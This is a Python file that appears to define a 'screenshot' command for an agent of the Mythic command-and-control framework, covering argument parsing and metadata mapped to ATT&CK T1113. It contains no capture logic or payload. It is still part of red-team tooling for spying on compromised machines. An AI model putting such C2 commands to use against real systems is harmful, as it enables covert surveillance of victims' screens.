from mythic_container.MythicCommandBase import *


class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="display",
                cli_name="display",
                display_name="Display Index",
                type=ParameterType.Number,
                description="Optional display index to capture (defaults to the primary display).",
                default_value=0,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=0)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            # no display requested: send empty tasking, per the agent contract
            self.set_manual_args("")
            return
        if self.command_line.strip()[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("display", self.command_line.strip(), ParameterType.Number)


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot [display]"
    description = "Capture a screenshot of the target's desktop."
    version = 1
    author = "@sourcefrenchy"
    argument_class = ScreenshotArguments
    attackmapping = ["T1113"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
